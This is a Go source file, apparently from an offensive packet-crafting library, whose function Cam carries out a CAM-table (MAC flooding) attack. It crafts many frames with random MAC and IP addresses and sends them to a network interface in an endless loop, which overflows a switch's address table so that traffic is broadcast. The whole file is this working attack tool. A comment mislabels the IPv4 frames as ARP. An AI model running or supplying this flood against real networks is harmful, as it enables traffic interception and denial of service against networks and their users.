package higherlevel

import (
	"fmt"
	"sync"

	golayers "github.com/google/gopacket/layers"
	craft "github.com/tiagomdiogo/GoPpy/packet"
	communication "github.com/tiagomdiogo/GoPpy/supersocket"
	"github.com/tiagomdiogo/GoPpy/utils"
)

func Cam(iface string, packetCount int) {

	ss, err := communication.NewSuperSocket(iface, "")
	if err != nil {
		fmt.Println("Error creating SuperSocket:", err)
		return
	}

	packets := make([][]byte, packetCount)
	var wg sync.WaitGroup

	for i := 0; i < packetCount; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			randomSrcMAC := utils.ParseMACGen()
			randomDstMac := utils.ParseMACGen()
			etherLayer := craft.EthernetLayer()
			etherLayer.SetSrcMAC(randomSrcMAC)
			etherLayer.SetDstMAC(randomDstMac)
			etherLayer.SetEthernetType(golayers.EthernetTypeIPv4)
			ipLayer := craft.IPv4Layer()
			ipLayer.SetSrcIP(utils.ParseIPGen())
			ipLayer.SetDstIP(utils.ParseIPGen())

			packets[i], err = craft.CraftPacket(etherLayer.Layer(), ipLayer.Layer())
			if err != nil {
				fmt.Println("Error crafting Ethernet packet:", err)
				return
			}
		}(i)
	}

	wg.Wait()

	// Flood the network with the ARP packets
	for {
		err = ss.SendMultiplePackets(packets, 10)
		if err != nil {
			fmt.Println("Error sending packets:", err)
			return
		}
	}
}
